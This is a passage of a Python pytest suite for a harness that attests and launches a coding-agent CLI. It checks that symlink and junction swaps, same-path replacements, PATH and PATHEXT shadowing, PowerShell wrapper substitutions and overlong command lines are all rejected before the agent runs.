    authority = NativeBackendFileAttestation.observe(path, "same-path regular file")
    assert authority.filesystem_identity.entry_kind == "REGULAR_FILE"

    path.unlink()
    path.mkdir()
    assert stat.S_ISDIR(os.lstat(path).st_mode)
    with pytest.raises(ValueError, match="regular file"):
        authority.validated()


def test_same_path_directory_replaced_by_regular_file_fails_fresh_request_authority(tmp_path: Path):
    h = _harness(tmp_path)
    request, _prompt = _request(h)
    assert request.work_workspace_identity.entry_kind == "DIRECTORY"

    displaced = h.work.with_name("displaced-workspace")
    h.work.rename(displaced)
    h.work.write_bytes(b"regular replacement at the authoritative directory path")
    assert stat.S_ISREG(os.lstat(h.work).st_mode)
    with pytest.raises(ValueError, match="directory"):
        request.validated()


@pytest.mark.parametrize("target_kind", ("regular-file", "directory"))
def test_direct_symlink_entry_never_becomes_authority(tmp_path: Path, target_kind: str):
    target = tmp_path / f"{target_kind}-target"
    link = tmp_path / f"{target_kind}-link"
    if target_kind == "regular-file":
        target.write_bytes(b"target")
        target_is_directory = False
    else:
        target.mkdir()
        target_is_directory = True
    try:
        os.symlink(target, link, target_is_directory=target_is_directory)
    except (OSError, NotImplementedError):
        pytest.skip(f"{target_kind} symlink creation unavailable")

    if target_kind == "regular-file":
        with pytest.raises(ValueError, match="redirecting"):
            NativeBackendFileAttestation.observe(link, "redirecting regular file")
    else:
        with pytest.raises(ValueError, match="redirecting"):
            _safe_directory(link, "redirecting directory")


def test_redirecting_entry_replacing_prior_plain_file_fails_fresh_authority(tmp_path: Path):
    path = tmp_path / "authoritative-file"
    target = tmp_path / "replacement-target"
    path.write_bytes(b"original")
    target.write_bytes(b"replacement")
    authority = NativeBackendFileAttestation.observe(path, "plain regular authority")
    path.unlink()
    try:
        os.symlink(target, path, target_is_directory=False)
    except (OSError, NotImplementedError):
        pytest.skip("regular-file symlink creation unavailable")
    with pytest.raises(ValueError, match="redirecting"):
        authority.validated()


def test_windows_junction_replacing_prior_plain_directory_fails_fresh_authority(tmp_path: Path):
    if os.name != "nt":
        pytest.skip("Windows junction regression")
    path = tmp_path / "authoritative-directory"
    target = tmp_path / "junction-target"
    path.mkdir(); target.mkdir()
    _plain, authority = _safe_directory(path, "plain directory authority")
    path.rmdir()
    completed = subprocess.run(
        ["cmd.exe", "/d", "/c", "mklink", "/J", str(path), str(target)],
        shell=False, capture_output=True,
    )
    if completed.returncode != 0:
        pytest.skip("Windows junction creation unavailable")
    with pytest.raises(ValueError, match="redirecting"):
        _safe_directory(path, "junction replacement")
    assert authority.entry_kind == "DIRECTORY"


def test_regular_file_zero_and_40960_sizes_are_exact_and_noninterchangeable(tmp_path: Path):
    empty = tmp_path / "empty.bin"; empty.write_bytes(b"")
    large = tmp_path / "large.bin"; large.write_bytes(b"x" * 40960)
    empty_authority = NativeBackendFileAttestation.observe(empty, "empty regular file")
    large_authority = NativeBackendFileAttestation.observe(large, "40960-byte regular file")

    assert empty_authority.filesystem_identity.entry_kind == "REGULAR_FILE"
    assert large_authority.filesystem_identity.entry_kind == "REGULAR_FILE"
    assert empty_authority.byte_count == empty_authority.filesystem_identity.size == 0
    assert large_authority.byte_count == large_authority.filesystem_identity.size == 40960
    same_other_fields = replace(empty_authority.filesystem_identity, size=40960)
    assert same_other_fields != empty_authority.filesystem_identity
    assert same_other_fields.entry_kind == "REGULAR_FILE"
    assert same_other_fields.to_dict()["size"] == 40960
    assert NativeFilesystemIdentity.from_stat(os.lstat(empty)).size == 0
    assert NativeFilesystemIdentity.from_stat(os.lstat(large)).size == 40960


@pytest.mark.parametrize("false_direction", ("smaller", "larger"))
@pytest.mark.parametrize("sha_mode", ("matching-content", "altered"))
def test_self_refingerprinted_wrapper_file_false_size_fails_fresh_authority(
    tmp_path: Path, false_direction: str, sha_mode: str,
):
    _root, _discovery, attestation = _wrapper_attestation(tmp_path)
    raw = attestation.to_dict()
    executable = raw["executable"]
    actual_size = executable["filesystem_identity"]["size"]
    false_size = actual_size - 1 if false_direction == "smaller" else actual_size + 1
    executable["filesystem_identity"]["size"] = false_size
    executable["byte_count"] = false_size
    if sha_mode == "altered":
        executable["sha256"] = "0" * 64
    raw["attestation_fingerprint"] = fingerprint({
        key: value for key, value in raw.items() if key != "attestation_fingerprint"
    })
    with pytest.raises(ValueError, match="identity changed"):
        attestation_from_dict(raw)


def test_mutable_root_lifecycle_allows_expected_children_and_forced_mtime_changes(tmp_path: Path):
    h = _harness(tmp_path)
    request, _prompt = _request(h)
    _evidence_parent, evidence_parent_identity = _safe_directory(h.evidence, "test evidence parent")
    recorded = (
        (h.work, request.work_workspace_identity),
        (h.store.directory, request.evidence_store_identity),
        (h.store.artifact_directory, request.artifact_directory_identity),
        (h.evidence, evidence_parent_identity),
    )

    (h.work / "expected-work-child").mkdir()
    (h.work / "expected-work-child" / "draft.txt").write_text("expected", encoding="utf-8")
    (h.store.directory / "expected-sidecar-child.json").write_text("{}\n", encoding="utf-8")
    (h.store.artifact_directory / "expected-artifact.bin").write_bytes(b"expected")
    (h.evidence / "expected-evidence-child").mkdir()
    for path, identity in recorded:
        forced_mtime = identity.mtime_ns + 2_000_000_000
        os.utime(path, ns=(forced_mtime, forced_mtime))
        _fresh_path, fresh_identity = _safe_directory(path, f"fresh mutable {path.name}")
        assert fresh_identity.mtime_ns != identity.mtime_ns
        assert _same_mutable_directory_entry(identity, fresh_identity)
        assert fresh_identity.size == 0

    assert request.validated() is request
    h.store._assert_root_identity()
    h.store._assert_artifact_root_identity()


@pytest.mark.parametrize("role", ("workspace", "evidence-root", "artifact-root"))
def test_mutable_authority_rejects_same_path_physical_root_replacement(tmp_path: Path, role: str):
    h = _harness(tmp_path)
    request, _prompt = _request(h)
    path = {
        "workspace": h.work,
        "evidence-root": h.store.directory,
        "artifact-root": h.store.artifact_directory,
    }[role]
    displaced = path.with_name(f"displaced-{path.name}")
    path.rename(displaced)
    path.mkdir()
    if role == "evidence-root":
        (path / "artifacts").mkdir()
    with pytest.raises(ValueError, match="identity changed"):
        request.validated()


def test_mutable_workspace_sibling_substitution_fails_even_when_request_is_refingerprinted(tmp_path: Path):
    h = _harness(tmp_path)
    request, _prompt = _request(h)
    sibling = tmp_path / "workspace-sibling"; sibling.mkdir()
    substituted = replace(request, work_workspace=str(sibling), request_fingerprint="0" * 64)
    substituted = replace(substituted, request_fingerprint=fingerprint(substituted._body()))
    with pytest.raises(ValueError, match="identity changed"):
        substituted.validated()


def test_canary_parent_same_path_replacement_fails_exact_production_comparison(tmp_path: Path):
    parent = tmp_path / "canary-parent"; parent.mkdir()
    _path, authority = _safe_directory(parent, "canary parent authority")
    displaced = tmp_path / "displaced-canary-parent"
    parent.rename(displaced); parent.mkdir()
    _fresh_path, fresh = _safe_directory(parent, "replacement canary parent")
    assert not _same_directory_identity(authority, fresh)


def test_mutable_workspace_junction_replacement_fails_before_comparison(tmp_path: Path):
    if os.name != "nt":
        pytest.skip("Windows junction regression")
    h = _harness(tmp_path)
    request, _prompt = _request(h)
    displaced = h.work.with_name("junction-workspace-target")
    h.work.rename(displaced)
    completed = subprocess.run(
        ["cmd.exe", "/d", "/c", "mklink", "/J", str(h.work), str(displaced)],
        shell=False, capture_output=True,
    )
    if completed.returncode != 0:
        pytest.skip("Windows junction creation unavailable")
    with pytest.raises(ValueError, match="redirecting"):
        request.validated()


@pytest.mark.parametrize("role", ("source", "wrapper", "selected-version", "mutable-execution-root"))
def test_raw_directory_size_matrix_is_independent_for_every_authority_role(tmp_path: Path, role: str):
    wrapper_root = _wrapper_chain_installation(tmp_path)
    paths = {
        "source": tmp_path / "source",
        "wrapper": wrapper_root,
        "selected-version": wrapper_root / "versions" / "2026.07.09-a3815c0",
        "mutable-execution-root": tmp_path / "mutable-execution-root",
    }
    paths["source"].mkdir(); paths["mutable-execution-root"].mkdir()
    metadata = os.lstat(paths[role])
    identities = tuple(
        NativeFilesystemIdentity.from_stat(_StatOverride(metadata, st_size=size))
        for size in (0, 4096, 8192, 40960, 12345)
    )
    assert all(identity.entry_kind == "DIRECTORY" and identity.size == 0 for identity in identities)
    assert len(set(identities)) == 1
    assert _same_mutable_directory_entry(identities[0], identities[-1])


def test_v3_source_directory_raw_size_is_normalized_but_git_checks_remain_independent(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    source_parent = tmp_path / "source-parent"; source_parent.mkdir()
    source = build_canary_repository(source_parent, repository_name="source").repository
    head = _command(["git", "rev-parse", "HEAD"], cwd=source).stdout.strip()
    _wrapper_root, _discovery, attestation = _wrapper_attestation(tmp_path)
    _override_lstat(monkeypatch, {source: _alternating_directory_size})
    payloads = tuple(
        build_authorization_payload(
            source_repository=source, source_head=head, run_id=_V3_RUN_ID, session_id=_V3_RUN_ID,
            attestation=attestation, run_root=tmp_path / _V3_RUN_ID, timeout_seconds=900,
        )
        for _ in range(4)
    )
    assert len({item.payload_fingerprint for item in payloads}) == 1
    assert all(item.source_repository_identity.size == 0 for item in payloads)
    noncanonical = payloads[0].to_dict(); noncanonical["source_repository_identity"]["size"] = 40960
    with pytest.raises(ValueError, match="canonical zero"):
        NativeCanaryAuthorizationPayload.from_dict(noncanonical)
    assert _git_source_preflight(source, "f" * 40)[0] is False
    assert _git_source_preflight(source, head)[0] is True
    (source / "dirty.txt").write_text("dirty", encoding="utf-8")
    assert _git_source_preflight(source, head)[0] is False


def test_wrapper_chain_directory_raw_sizes_do_not_change_attestation(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    wrapper_root = _wrapper_chain_installation(tmp_path)
    discovery = FakeWrapperChainDiscovery(wrapper_root)
    selected_root = wrapper_root / "versions" / "2026.07.09-a3815c0"
    _override_lstat(monkeypatch, {
        wrapper_root: _alternating_directory_size,
        selected_root: _alternating_directory_size,
    })
    attestations = tuple(_attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery) for _ in range(6))
    assert len({item.attestation_fingerprint for item in attestations}) == 1
    assert all(item.command_resolution.wrapper_root_identity.size == 0 for item in attestations)
    assert all(item.selected_version_root_identity.size == 0 for item in attestations)
    for identity_path in (
        ("command_resolution", "wrapper_root_identity"),
        ("selected_version_root_identity",),
    ):
        raw = attestations[0].to_dict()
        target = raw
        for key in identity_path:
            target = target[key]
        target["size"] = 40960
        with pytest.raises(ValueError, match="canonical zero"):
            attestation_from_dict(raw)


@pytest.mark.parametrize("target", ("wrapper", "selected"))
@pytest.mark.parametrize("field", ("st_dev", "st_ino", "st_mode", "st_file_attributes", "st_mtime_ns"))
def test_wrapper_chain_immutable_directory_metadata_changes_block(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, target: str, field: str,
):
    wrapper_root, _discovery, attestation = _wrapper_attestation(tmp_path)
    selected_root = wrapper_root / "versions" / attestation.selected_version
    changed_path = wrapper_root if target == "wrapper" else selected_root

    def changed(_index: int, metadata: os.stat_result) -> dict[str, int]:
        value = int(getattr(metadata, field, 0))
        if field == "st_mode":
            changed_mode = value ^ stat.S_IWUSR
            assert stat.S_ISDIR(changed_mode)
            return {field: changed_mode}
        if field == "st_file_attributes":
            return {field: value ^ 0x2}
        return {field: value + 1}

    _override_lstat(monkeypatch, {changed_path: changed})
    with pytest.raises(ValueError, match="identity changed"):
        attestation.validated()


def test_payload_and_attestation_are_byte_reproducible_under_all_alternating_directory_sizes(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    wrapper_root = _wrapper_chain_installation(tmp_path)
    selected_root = wrapper_root / "versions" / "2026.07.09-a3815c0"
    discovery = FakeWrapperChainDiscovery(wrapper_root)
    source = tmp_path / "source-repository"; source.mkdir()
    mutable_root = tmp_path / "mutable-execution-root"; mutable_root.mkdir()
    run_root = tmp_path / _V3_RUN_ID
    _override_lstat(monkeypatch, {
        wrapper_root: _alternating_directory_size,
        selected_root: _alternating_directory_size,
        source: _alternating_directory_size,
        mutable_root: _alternating_directory_size,
    })
    source_identities: set[str] = set()
    wrapper_identities: set[str] = set()
    selected_identities: set[str] = set()
    mutable_identities: set[str] = set()
    command_resolution_fingerprints: set[str] = set()
    backend_fingerprints: set[str] = set()
    payload_fingerprints: set[str] = set()
    canonical_payloads: set[bytes] = set()
    canonical_hashes: set[str] = set()
    vector_label = "PRE_COMMIT_PROVISIONAL_NOT_AUTHORIZABLE"
    for _ in range(20):
        attestation = _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)
        payload = build_authorization_payload(
            source_repository=source, source_head="e" * 40, run_id=_V3_RUN_ID, session_id=_V3_RUN_ID,
            attestation=attestation, run_root=run_root, timeout_seconds=900,
        )
        _mutable_path, mutable_identity = _safe_directory(mutable_root, "mutable execution root")
        serialized = _canonical_bytes(payload.to_dict())
        reloaded = NativeCanaryAuthorizationPayload.from_dict(json.loads(serialized))
        assert reloaded == payload
        source_identities.add(json.dumps(payload.source_repository_identity.to_dict(), sort_keys=True))
        wrapper_identities.add(json.dumps(attestation.command_resolution.wrapper_root_identity.to_dict(), sort_keys=True))
        selected_identities.add(json.dumps(attestation.selected_version_root_identity.to_dict(), sort_keys=True))
        mutable_identities.add(json.dumps(mutable_identity.to_dict(), sort_keys=True))
        command_resolution_fingerprints.add(fingerprint(attestation.command_resolution.to_dict()))
        backend_fingerprints.add(attestation.attestation_fingerprint)
        payload_fingerprints.add(payload.payload_fingerprint)
        canonical_payloads.add(serialized)
        canonical_hashes.add(hashlib.sha256(serialized).hexdigest())
        assert attestation.command_resolution.wrapper_root_identity.size == 0
        assert attestation.selected_version_root_identity.size == 0
        assert payload.source_repository_identity.size == 0
        assert mutable_identity.size == 0
    assert vector_label == "PRE_COMMIT_PROVISIONAL_NOT_AUTHORIZABLE"
    assert len(source_identities) == len(wrapper_identities) == len(selected_identities) == len(mutable_identities) == 1
    assert len(command_resolution_fingerprints) == len(backend_fingerprints) == len(payload_fingerprints) == 1
    assert len(canonical_payloads) == len(canonical_hashes) == 1


# --- Act 2A.3E: deterministic Windows command-resolution authority ---------

def _path_value(*entries: Path | str) -> str:
    return ";".join(os.fspath(item) for item in entries)


def test_deterministic_windows_resolver_selects_bare_cmd_in_path_and_pathext_order(tmp_path: Path):
    earlier = tmp_path / "earlier"; earlier.mkdir()
    winner_root = tmp_path / "winner"; winner_root.mkdir()
    winner = winner_root / "cursor-agent.cmd"; winner.write_bytes(_OBSERVED_CMD_WRAPPER.encode("ascii"))
    resolved = _deterministic_windows_resolve(
        command="cursor-agent", path_value=_path_value(earlier, winner_root), pathext_value=".COM;.CMD;.EXE",
    )
    assert Path(resolved.winner.canonical_path) == winner.resolve()
    assert resolved.authoritative_path_index == 1
    assert resolved.winning_pathext_index == 1
    assert resolved.path_entries == (str(earlier), str(winner_root))
    assert resolved.pathext == (".COM", ".CMD", ".EXE")
    assert len(resolved.material_candidates) == 1


def test_path_order_changes_winner_and_authority_fingerprint(tmp_path: Path):
    left = tmp_path / "left"; right = tmp_path / "right"; left.mkdir(); right.mkdir()
    (left / "cursor-agent.cmd").write_bytes(b"left")
    (right / "cursor-agent.cmd").write_bytes(b"right")
    first = _deterministic_windows_resolve(command="cursor-agent", path_value=_path_value(left, right), pathext_value=".CMD")
    second = _deterministic_windows_resolve(command="cursor-agent", path_value=_path_value(right, left), pathext_value=".CMD")
    assert first.winner.sha256 != second.winner.sha256
    assert fingerprint(first.to_dict()) != fingerprint(second.to_dict())


def test_pathext_order_changes_winner_and_authority_fingerprint(tmp_path: Path):
    root = tmp_path / "bin"; root.mkdir()
    (root / "cursor-agent.com").write_bytes(b"com")
    (root / "cursor-agent.cmd").write_bytes(b"cmd")
    com_first = _deterministic_windows_resolve(command="cursor-agent", path_value=str(root), pathext_value=".COM;.CMD")
    cmd_first = _deterministic_windows_resolve(command="cursor-agent", path_value=str(root), pathext_value=".CMD;.COM")
    assert Path(com_first.winner.canonical_path).suffix.casefold() == ".com"
    assert Path(cmd_first.winner.canonical_path).suffix.casefold() == ".cmd"
    assert fingerprint(com_first.to_dict()) != fingerprint(cmd_first.to_dict())


def test_missing_cmd_pathext_and_relative_path_component_fail_closed(tmp_path: Path):
    root = tmp_path / "bin"; root.mkdir(); (root / "cursor-agent.cmd").write_bytes(b"cmd")
    with pytest.raises(ValueError, match="found no"):
        _deterministic_windows_resolve(command="cursor-agent", path_value=str(root), pathext_value=".COM;.EXE")
    with pytest.raises(ValueError, match="relative"):
        _deterministic_windows_resolve(command="cursor-agent", path_value=_path_value("relative-bin", root), pathext_value=".CMD")


def test_duplicate_path_entries_are_deterministic_and_fully_bound(tmp_path: Path):
    empty = tmp_path / "empty"; root = tmp_path / "bin"; empty.mkdir(); root.mkdir()
    (root / "cursor-agent.cmd").write_bytes(b"cmd")
    duplicate = _deterministic_windows_resolve(
        command="cursor-agent", path_value=_path_value(empty, empty, root), pathext_value=".CMD",
    )
    single = _deterministic_windows_resolve(
        command="cursor-agent", path_value=_path_value(empty, root), pathext_value=".CMD",
    )
    assert duplicate.authoritative_path_index == 2 and single.authoritative_path_index == 1
    assert _same_file_authority(duplicate.winner, single.winner)
    assert duplicate.path_sha256 != single.path_sha256


def test_empty_path_component_blocks_when_current_directory_can_affect_winner(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    later = tmp_path / "later"; later.mkdir()
    (tmp_path / "cursor-agent.cmd").write_bytes(b"cwd shadow")
    (later / "cursor-agent.cmd").write_bytes(b"later")
    monkeypatch.chdir(tmp_path)
    with pytest.raises(ValueError, match="empty PATH component"):
        _deterministic_windows_resolve(
            command="cursor-agent", path_value=";" + str(later), pathext_value=".CMD",
        )


def test_candidate_directory_and_redirecting_candidate_are_rejected(tmp_path: Path):
    directory_root = tmp_path / "directory-root"; directory_root.mkdir(); (directory_root / "cursor-agent.cmd").mkdir()
    with pytest.raises(ValueError, match="regular file"):
        _deterministic_windows_resolve(command="cursor-agent", path_value=str(directory_root), pathext_value=".CMD")

    link_root = tmp_path / "link-root"; link_root.mkdir()
    target = tmp_path / "target.cmd"; target.write_bytes(b"target")
    link = link_root / "cursor-agent.cmd"
    try:
        os.symlink(target, link)
    except (OSError, NotImplementedError):
        pytest.skip("file symlink creation unavailable")
    with pytest.raises(ValueError, match="redirecting"):
        _deterministic_windows_resolve(command="cursor-agent", path_value=str(link_root), pathext_value=".CMD")


def test_conflicting_case_variants_at_same_precedence_position_are_rejected(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    root = tmp_path / "root"; left = tmp_path / "left"; right = tmp_path / "right"
    root.mkdir(); left.mkdir(); right.mkdir()
    lower = left / "cursor-agent.cmd"; upper = right / "CURSOR-AGENT.CMD"
    lower.write_bytes(b"lower"); upper.write_bytes(b"upper")
    original = Path.iterdir

    def adversarial_iterdir(path: Path):
        if path == root:
            return iter((lower, upper))
        return original(path)

    monkeypatch.setattr(Path, "iterdir", adversarial_iterdir)
    with pytest.raises(ValueError, match="case variants"):
        _deterministic_windows_resolve(command="cursor-agent", path_value=str(root), pathext_value=".CMD")


@pytest.mark.parametrize("command", ("C:\\Tools\\cursor-agent.cmd", ".\\cursor-agent", "bin/cursor-agent"))
def test_deterministic_resolver_rejects_caller_supplied_command_paths(tmp_path: Path, command: str):
    with pytest.raises(ValueError, match="fixed bare"):
        _deterministic_windows_resolve(command=command, path_value=str(tmp_path), pathext_value=".CMD")


def test_earlier_malicious_candidate_shadows_expected_wrapper_and_powershell_blocks(tmp_path: Path):
    expected_parent = tmp_path / "expected"; expected_parent.mkdir()
    expected = _wrapper_chain_installation(expected_parent)
    malicious = tmp_path / "malicious"; malicious.mkdir()
    malicious_cmd = malicious / "cursor-agent.cmd"; malicious_cmd.write_bytes(_OBSERVED_CMD_WRAPPER.encode("ascii"))
    records = (
        ("ExternalScript", "cursor-agent.ps1", str(expected / "cursor-agent.ps1")),
        ("Application", "cursor-agent.cmd", str(malicious_cmd)),
        ("Application", "cursor-agent.cmd", str(expected / "cursor-agent.cmd")),
    )
    discovery = FakeWrapperChainDiscovery(
        expected, which=str(malicious_cmd), path=_path_value(malicious, expected),
        powershell_records=records, powershell_preferred=records[0],
    )
    with pytest.raises(ValueError, match="out-of-root"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)


def test_deterministic_and_shutil_which_missing_differing_and_replaced_winners_block(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    with pytest.raises(ValueError, match="shutil.which found no"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(root, which_unavailable=True))
    elsewhere = tmp_path / "elsewhere"; elsewhere.mkdir()
    different = elsewhere / "cursor-agent.cmd"; different.write_bytes(_OBSERVED_CMD_WRAPPER.encode("ascii"))
    with pytest.raises(ValueError, match="disagree"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(root, which=str(different)))

    class ReplacingWhich(FakeWrapperChainDiscovery):
        def which_cursor_agent(self, *, path_value: str, pathext_value: str) -> str | None:
            path = self.root / "cursor-agent.cmd"
            displaced = self.root / "cursor-agent-original.cmd"
            path.rename(displaced)
            path.write_bytes(_OBSERVED_CMD_WRAPPER.replace("@echo off", "@echo on").encode("ascii"))
            return str(path)

    with pytest.raises(ValueError, match="identity changed|disagree"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=ReplacingWhich(root))


@pytest.mark.parametrize("changed", ("path", "pathext"))
def test_path_or_pathext_change_between_request_and_pre_spawn_blocks_with_zero_runner_calls(tmp_path: Path, changed: str):
    h, discovery = _wrapper_chain_harness(tmp_path)
    state = h.session_store.load(h.session_id)
    prompt = build_native_agent_prompt(mission=state.mission, gate_contract=state.current_gate, work_workspace=h.work)
    request = NativeExecutionRequest.create(
        session_id=state.session_id, gate_id=state.current_gate.gate_id, execution_attempt_index=0,
        mission_fingerprint=state.mission.mission_fingerprint,
        gate_contract_fingerprint=state.current_gate.contract_fingerprint,
        work_workspace=h.work, evidence_store_root=h.store.directory, artifact_directory=h.store.artifact_directory,
        attestation=h.attestation, prompt=prompt, timeout_seconds=30, stdout_byte_limit=4096, stderr_byte_limit=2048,
    )
    earlier = tmp_path / "new-earlier-path"; earlier.mkdir()
    if changed == "path":
        discovery.path = _path_value(earlier, discovery.root, "C:\\Windows")
    else:
        discovery.pathext = ".EXE;.COM;.BAT;.CMD"
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(
            request=request, prompt=prompt, source_repository=h.source, canary_parent=h.root,
            allowed_parent_children=frozenset({h.work.name}), evidence_store_root=h.store.directory,
            artifact_directory=h.store.artifact_directory, required_commit_message=REQUIRED_COMMIT_MESSAGE,
            required_material_paths=EXPECTED_MATERIAL_PATHS, execution_store=h.store,
        )
    assert h.runner.invocations == []


@pytest.mark.skipif(os.name != "nt", reason="Windows command-line limit")
def test_unspawnable_argv_is_refused_before_the_native_attempt_is_reserved(tmp_path: Path):
    """The exact defect that killed native-cursor-neon-relay-001.

    That run reserved its single native attempt and *then* died at
    ``CreateProcessW`` with WinError 206.  The guard must refuse first, so the
    attempt slot, the provider budget and the runner all stay untouched.
    """

    from admissible.delegated_gate.native_executor import (
        NativeArgvTooLongError,
        WINDOWS_MAX_COMMAND_LINE_CHARS,
    )

    h, _ = _wrapper_chain_harness(tmp_path)
    state = h.session_store.load(h.session_id)
    base = build_native_agent_prompt(
        mission=state.mission, gate_contract=state.current_gate, work_workspace=h.work
    )
    # Keep the harness-controlled header; make the final argv unspawnable while
    # staying inside the 65536-byte prompt bound -- exactly the regime the real
    # 64660-byte Neon Relay prompt lives in.
    prompt = base + ("X" * (64000 - len(base.encode("utf-8"))))
    assert WINDOWS_MAX_COMMAND_LINE_CHARS < len(prompt.encode("utf-8")) <= 65536
    request = NativeExecutionRequest.create(
        session_id=state.session_id, gate_id=state.current_gate.gate_id, execution_attempt_index=0,
        mission_fingerprint=state.mission.mission_fingerprint,
        gate_contract_fingerprint=state.current_gate.contract_fingerprint,
        work_workspace=h.work, evidence_store_root=h.store.directory,
        artifact_directory=h.store.artifact_directory,
        attestation=h.attestation, prompt=prompt, timeout_seconds=30,
        stdout_byte_limit=4096, stderr_byte_limit=2048,
    )
    h.store.create_request(request)
    with pytest.raises(NativeArgvTooLongError) as excinfo:
        h.executor.execute(
            request=request, prompt=prompt, source_repository=h.source, canary_parent=h.root,
            allowed_parent_children=frozenset({h.work.name}), evidence_store_root=h.store.directory,
            artifact_directory=h.store.artifact_directory, required_commit_message=REQUIRED_COMMIT_MESSAGE,
            required_material_paths=EXPECTED_MATERIAL_PATHS, execution_store=h.store,
        )

    assert str(WINDOWS_MAX_COMMAND_LINE_CHARS) in str(excinfo.value)
    assert "X" * 100 not in str(excinfo.value), "diagnostic must not carry prompt content"
    # Nothing was consumed: no attempt, no process, no runner call.
    assert not h.store.has_attempt_reserved(state.session_id, state.current_gate.gate_id, 0)
    assert not h.store.has_process_started(state.session_id, state.current_gate.gate_id, 0)
    assert h.runner.invocations == []


@pytest.mark.skipif(os.name != "nt", reason="Windows command-line limit")
def test_a_spawnable_argv_still_reserves_and_runs(tmp_path: Path):
    """The guard is not simply refusing everything."""

    h, _ = _wrapper_chain_harness(tmp_path)
    state = h.session_store.load(h.session_id)
    prompt = build_native_agent_prompt(
        mission=state.mission, gate_contract=state.current_gate, work_workspace=h.work
    )
    request = NativeExecutionRequest.create(
        session_id=state.session_id, gate_id=state.current_gate.gate_id, execution_attempt_index=0,
        mission_fingerprint=state.mission.mission_fingerprint,
        gate_contract_fingerprint=state.current_gate.contract_fingerprint,
        work_workspace=h.work, evidence_store_root=h.store.directory,
        artifact_directory=h.store.artifact_directory,
        attestation=h.attestation, prompt=prompt, timeout_seconds=30,
        stdout_byte_limit=4096, stderr_byte_limit=2048,
    )
    h.store.create_request(request)
    h.executor.execute(
        request=request, prompt=prompt, source_repository=h.source, canary_parent=h.root,
        allowed_parent_children=frozenset({h.work.name}), evidence_store_root=h.store.directory,
        artifact_directory=h.store.artifact_directory, required_commit_message=REQUIRED_COMMIT_MESSAGE,
        required_material_paths=EXPECTED_MATERIAL_PATHS, execution_store=h.store,
    )
    assert h.store.has_attempt_reserved(state.session_id, state.current_gate.gate_id, 0)
    assert len(h.runner.invocations) == 1


def test_powershell_inventory_requires_adjacent_wrappers_and_rejects_substitutions(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    with pytest.raises(ValueError, match="adjacent .ps1"):
        _attest_wrapper_chain_cursor(
            _WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(root, powershell=(str(root / "cursor-agent.cmd"),)),
        )
    elsewhere = tmp_path / "elsewhere"; elsewhere.mkdir()
    outside_ps = elsewhere / "cursor-agent.ps1"; outside_ps.write_bytes(_OBSERVED_PS_WRAPPER.encode("utf-8"))
    with pytest.raises(ValueError, match="out-of-root"):
        _attest_wrapper_chain_cursor(
            _WRAPPER_CONFIG,
            discovery=FakeWrapperChainDiscovery(
                root, powershell=(str(outside_ps), str(root / "cursor-agent.cmd")),
                powershell_preferred=("ExternalScript", outside_ps.name, str(outside_ps)),
            ),
        )
    for record in (
        ("Alias", "cursor-agent", ""),
        ("Function", "cursor-agent", ""),
        ("Application", "cursor-agent.exe", str(Path(sys.executable).resolve())),
    ):
        with pytest.raises(ValueError, match="alias|pathless|out-of-root"):
            _attest_wrapper_chain_cursor(
                _WRAPPER_CONFIG,
                discovery=FakeWrapperChainDiscovery(root, powershell_records=(record,), powershell_preferred=record),
            )


def test_powershell_inventory_order_is_canonical_but_material_inventory_change_rebinds(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    ps = ("ExternalScript", "cursor-agent.ps1", str(root / "cursor-agent.ps1"))
    cmd = ("Application", "cursor-agent.cmd", str(root / "cursor-agent.cmd"))
    first = _attest_wrapper_chain_cursor(
        _WRAPPER_CONFIG,
        discovery=FakeWrapperChainDiscovery(root, powershell_records=(ps, cmd), powershell_preferred=ps),
    )
    reordered = _attest_wrapper_chain_cursor(
        _WRAPPER_CONFIG,
        discovery=FakeWrapperChainDiscovery(root, powershell_records=(cmd, ps), powershell_preferred=ps),
    )
    changed = _attest_wrapper_chain_cursor(
        _WRAPPER_CONFIG,
        discovery=FakeWrapperChainDiscovery(root, powershell_records=(ps, cmd, cmd), powershell_preferred=ps),
    )
    assert first == reordered
    assert changed.attestation_fingerprint != first.attestation_fingerprint
    assert first.command_resolution.powershell_prefers_powershell_wrapper is True


def test_where_diagnostic_variation_is_visible_but_excluded_from_authority_and_payload(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    source = tmp_path / "source"; source.mkdir()
    run_root = tmp_path / "future-run"
    variants = (
        FakeWrapperChainDiscovery(root),
        FakeWrapperChainDiscovery(root, where=(), where_exit_code=1),
        FakeWrapperChainDiscovery(root, where_unavailable=True),
        FakeWrapperChainDiscovery(root, where_execution_error=True, where_stderr=b"synthetic execution error"),
    )
    observed = tuple(_attest_wrapper_chain_cursor_observed(_WRAPPER_CONFIG, discovery=item) for item in variants)
    assert tuple(item[1].status for item in observed) == (
        WindowsWhereDiagnosticStatus.MATCHING_RESULT,
        WindowsWhereDiagnosticStatus.EMPTY_RESULT,
        WindowsWhereDiagnosticStatus.UNAVAILABLE,
        WindowsWhereDiagnosticStatus.EXECUTION_ERROR,
    )
    attestations = tuple(item[0] for item in observed)
    payloads = tuple(
        build_authorization_payload(
            source_repository=source, source_head="e" * 40, run_id="future-run", session_id="future-run",
            attestation=item, run_root=run_root, timeout_seconds=900,
        )
        for item in attestations
    )
    assert len({item.attestation_fingerprint for item in attestations}) == 1
    assert len({item.payload_fingerprint for item in payloads}) == 1
    assert len({_canonical_bytes(item.to_dict()) for item in payloads}) == 1
    assert "where_diagnostic" not in attestations[0].to_dict()
    assert "where_paths" not in attestations[0].command_resolution.to_dict()


